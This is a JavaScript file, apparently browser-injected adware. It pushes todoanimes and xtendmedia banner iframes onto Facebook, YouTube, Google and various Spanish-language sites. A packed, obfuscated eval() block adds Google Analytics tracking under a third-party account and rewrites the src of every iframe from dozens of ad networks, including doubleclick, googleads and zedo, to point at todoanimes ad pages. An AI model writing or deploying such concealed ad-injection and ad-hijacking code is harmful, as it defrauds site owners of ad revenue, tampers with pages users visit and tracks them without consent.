
function cookietime() {
	cad=new Date();
	cad.setTime(cad.getTime() + (1*1*5*60*1000));
	expira="; expires=" + cad.toGMTString();
    document.cookie = "visitado=false" + expira;
	
}
function rand(l,u){return Math.floor((Math.random() * (u-l+1))+l);}

function otros(){if(window.location.href.match(/facebook\.com\/plugins/i)){ return false;} else if(window.location.href.match(/facebook\.com\/connect/i)){ return false;} else if(window.location.href.match(/facebook\.com\/attachments/i)){ return false;} else if(window.location.href.match(/youtube\.com\/subscribe_widget/i)){ return false;} else if(window.location.href.match(/youtube\.com\/embed/i)){ return false;} else if(window.location.href.match(/platform\.twitter\.com/i)){ return false;} else if(window.location.href.match(/plusone/i)){ return false; } else if(window.location.href.match(/support/i)){ return false;}else if(window.location.href.match(/analytics/i)){ return false; } else if(window.location.href.match(/adsense/i)){ return false; } else { return true; }} 

if (otros()){ 

	var numerox = rand(1,3);
	var ads = new Array();
	if(window.location.href.match(/^http:\/\/(www\.)?facebook\.com/i)){ ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2858611";
	
	} else if(window.location.href.match(/^http:\/\/(www\.)?youtube\./i)) { ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2858611";
	
	} else if(window.location.href.match(/^http:\/\/(www\.)?google\./i)) { ads[2]="http://statico.todoanimes.com/google.html";
	
	} else if (window.location.href.match(/marca\./i) || window.location.href.match(/seriesyonkis\.com/i) || window.location.href.match(/mcanime\.net/i) || window.location.href.match(/taringa\.net/i) || window.location.href.match(/ole\.com\.ar/i) || window.location.href.match(/tuenti\.com/i) || window.location.href.match(/jaidefinichon\.com/i) || window.location.href.match(/mimejorfrase1\.com\.ar/i) || window.location.href.match(/musica\.com/i) || window.location.href.match(/peliculasyonkis\.com/i) || window.location.href.match(/cinetube\.es/i) || window.location.href.match(/submanga\.com/i) || window.location.href.match(/cuantocabron\.com/i) || window.location.href.match(/cuevana\.tv/i) || window.location.href.match(/minijuegos\.com/i) || window.location.href.match(/juegos\.com/i) || window.location.href.match(/rojadirecta\.me/i)){ ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2738506";
	
	} else { var publi="no";}

	if ((publi != "no") && (document.cookie.indexOf('visitado=false')<0)) { 
		var s = document.createElement('iframe');s.setAttribute("src", ""+ads[2]+"");s.setAttribute("width", "728");s.setAttribute("height", "90");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
		var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 96%; bottom: 65px;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://img.todoanimes.com/cerrar.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:fixed;left:25%;bottom:0;width:732px;height:94px;z-index:99999;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementsByTagName('head')[0];hh.parentNode.insertBefore(x, hh);
	}

}

function validHost() {
        if (location.href.match(/static\.ak\./i)) {
            return false;
        } else if ("https:" == document.location.protocol) {
            return false;
        } else if (location.href.match(/\.addthis\.com\/static\//i)) {
            return false;
        } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
            return false;
        } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
            return false;
        } else if (location.href.match(/blank/i)) {
            return false;
        } else if (location.href.match(/^http\:\/\/analytics\./i)) {
            return false;
        } else if (location.href.match(/^\.hotmail\.com\//i)) {
            return false;
        } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
            return false;
        } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
            return false;
        } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
            return false;
        } else if (location.href.match(/ver-pelis\.net/i)) {
            return false;
        } else if (location.href.match(/ver-anime\.net/i)) {
            return false;
        } else if (location.href.match(/musicalandia\.net/i)) {
            return false;
        } else if (location.href.match(/ver-series\.net/i)) {
            return false;
        } else if (location.href.match(/musica-online\.org/i)) {
            return false;
        } else if (location.href.match(/ver-documentales\.net/i)) {
            return false;
        } else if (location.href.match(/todoanimes\.com/i)) {
            return false;
        } else if (location.href.match(/animeflv\.net/i)) {
            return false;
		} else if (location.href.match(/goojue\.com/i)) {
            return false;
		} else {
            return true;
        }
    }

eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('B 7(a){2(a.v==\'17\'&&a.r==\'1t\'){a.m="b://o.t.9/h/2S.q"}4 2(a.v==\'1l\'&&a.r==\'1q\'){a.m="b://o.t.9/h/C.q"}4 2(a.v==\'1F\'&&a.r==\'G\'){a.m="b://o.t.9/h/30.q"}4 2(a.v==\'S\'&&a.r==\'G\'){a.m="b://o.t.9/h/X.q"}4 2(a.v==\'11\'&&a.r==\'16\'){a.m="b://o.t.9/h/C.q"}l.n(["E","/1n"]);1p x}2(1s()){k l=l||[];l.n(["1z","1A-1E-1"]);l.n(["1N","1O"]);l.n(["24",x]);l.n(["E"]);l.n(["26",1,"2a 2w 2L","2R","0.6"]);(B(){k a=w.R("J");a.T="U/V";a.W=x;a.m=("K:"==w.Y.Z?"K://10":"b://p")+".12-13.9/14.15";k s=w.D("J")[0];s.18.19(a,s)}());k 1a="1b";k 1c="1d";k 1e="1f";k 1g="1";k 1h="1";k 1i="1j";k 3=w.D("5");1m(k i=0;i<3.1o;i++){5=3[i].m;2(5.8("^b://A.1r.9/c?")){7(3[i])}4 2(5.8("d.1u.9")){7(3[i])}4 2(5.8("^b://d.1v.9/c?")){7(3[i])}4 2(5.8("^b://d.1w.9/c?")){7(3[i])}4 2(5.8("^b://d.1x.9/c?")){7(3[i])}4 2(5.8("^b://d.1y.9/c?")){7(3[i])}4 2(5.8("^b://d.31.j/c?")){7(3[i])}4 2(5.8("^b://d.1B.9/c?")){7(3[i])}4 2(5.8("^b://h.1C-1D-F.9/c?")){7(3[i])}4 2(5.8("^b://d.y.9/c?")){7(3[i])}4 2(5.8("^b://h.1G.j/c?")){7(3[i])}4 2(5.8("^b://d.1H.9/c?")){7(3[i])}4 2(5.8("^b://d.1I.9/c?")){7(3[i])}4 2(5.8("^b://d.1J.j/c?")){7(3[i])}4 2(5.8("^b://h.y.9/c?")){7(3[i])}4 2(5.8("^b://d.e-1K.9/c?")){7(3[i])}4 2(5.8("^b://h.1L.9/c?")){7(3[i])}4 2(5.8("^b://d.1M.9/c?")){7(3[i])}4 2(5.8("^b://h.y.9/c?")){7(3[i])}4 2(5.8("^b://H.I.9/c?")){7(3[i])}4 2(5.8("^b://d.1P.9/c?")){7(3[i])}4 2(5.8("^b://d.F-1Q.j/c?")){7(3[i])}4 2(5.8("^b://H.I.9/c?")){7(3[i])}4 2(5.8("^b://d.1R.9/c?")){7(3[i])}4 2(5.8("^b://d.1S.9/c?")){7(3[i])}4 2(5.8("^b://d.1T.j/c?")){7(3[i])}4 2(5.8("^b://h.1U.9/c?")){7(3[i])}4 2(5.8("^b://d.1V.9/c?")){7(3[i])}4 2(5.8("^b://d.1W.9/c?")){7(3[i])}4 2(5.8("^b://d.1X.j/c?")){7(3[i])}4 2(5.8("^b://d.1Y.9/c?")){7(3[i])}4 2(5.8(".1Z.9/20")){7(3[i])}4 2(5.8("^b://d.21.9/c?")){7(3[i])}4 2(5.8("^b://d.22.9/c?")){7(3[i])}4 2(5.8("23.z.9/25.u?")){7(3[i])}4 2(5.8(".27.j/28/29.u")){7(3[i])}4 2(5.8("L.2b.9/")){7(3[i])}4 2(5.8(".2c.9/2d.u")){7(3[i])}4 2(5.8("h.2e.9/2f")){7(3[i])}4 2(5.8("h.2g.9/d")){7(3[i])}4 2(5.8("h.2h.9/5")){7(3[i])}4 2(5.8("L.2i.9/2j")){7(3[i])}4 2(5.8("2k.2l/z/")){7(3[i])}4 2(5.8("2m.2n-2o.9/2p")){7(3[i])}4 2(5.8("d.2q.2r/")){7(3[i])}4 2(5.8(".2s.9/c")){7(3[i])}4 2(5.8("d.2t.j/2u")){7(3[i])}4 2(5.8("o.2v.M/h/")){7(3[i])}4 2(5.8("p.2x.9/h/")){7(3[i])}4 2(5.8("2y.2z.9/2A-2B/2C/2D/h/2E.u")){7(3[i])}4 2(5.8("A.2F.9/")){7(3[i])}4 2(5.8("h.2G.9/")){7(3[i])}4 2(5.8("2H.2I.9/2J")){7(3[i])}4 2(5.8("p.2K.9/p/N")){7(3[i])}4 2(5.8(".2M.9/")){7(3[i])}4 2(5.8("h.2N.9/p/N/")){7(3[i])}4 2(5.8("2O.9/d.u")){7(3[i])}4 2(5.8("^b://d.2P.j/c?")){7(3[i])}4 2(5.8("2Q.g.O.j/2T/h?")){7(3[i])}4 2(5.8("h.P.j/z/")){7(3[i])}4 2(5.8("2U.g.O.j/2V/h?")){7(3[i])}4 2(5.8("2W.M/2X/")){7(3[i])}4 2(5.8("2Y.P.j/2Z/")){7(3[i])}4 2(5.8("h.Q.9")){7(3[i])}4 2(5.8("h.Q.9")){7(3[i])}4 2(5.8("f.1k.9")){7(3[i])}}}',62,188,'||if|iframes|else|iframe||otranet|match|com||http|st|ad||||ads||net|var|_gaq|src|push|statico|www|html|height||todoanimes|php|width|document|true|jumbaexchange|openx|adserving|function|ads300x250|getElementsByTagName|_trackPageview|media|600|go|cpmadvisors|script|https|adserver|tv|delivery|doubleclick|mcanime|creanis|createElement|120|type|text|javascript|async|ads120x600|location|protocol|ssl|336|google|analytics|ga|js|280|728|parentNode|insertBefore|zflag_nid|1336|zflag_cid|462|zflag_sid|478|zflag_width|zflag_height|zflag_sz|94|megaclick|300|for|trackBannerM|length|return|250|cpxinteractive|validHost|90|smowtion|foxnetworks|harrenmedianetwork|metanetwork|blinkdr|_setAccount|UA|adfunky|creafi|online|27189179|160|avazu|yieldads|adnetinteractive|bannerconnect|viral|tlvmedia|adperium|_setDomainName|none|xertive|servers|globe7|103092804|globaltakeoff|bluelithium|antventure|reduxmedia|adtegrity|directaclick|mediashakers|id|adserverplus|yieldmanager|tradex|_setAllowLinker|afr|_setCustomVar|affiz|tracking|iframedfp|ver|itsfogo|pasadserver|showBanner|lfstmedia|slot|sonicomusica|adpv|adtechus|adiframe|mooxar|info|bs|serving|sys|BurstingPipe|adserver01|de|adsmwt|vuiads|showads|seeon|Pelis|redditmedia|justjared|buzznet|wp|content|themes|default|banner|cpxadroit|mapcity|edge|actaads|a_|adsomega|Plugin|zedo|ad4game|multiupload|adnetwork|googleads|plugin_version|ads728x90|pagead|pubads|gampad|cuevana|banners|images|manga|ads160x600|z5x'.split('|'),0,{}))
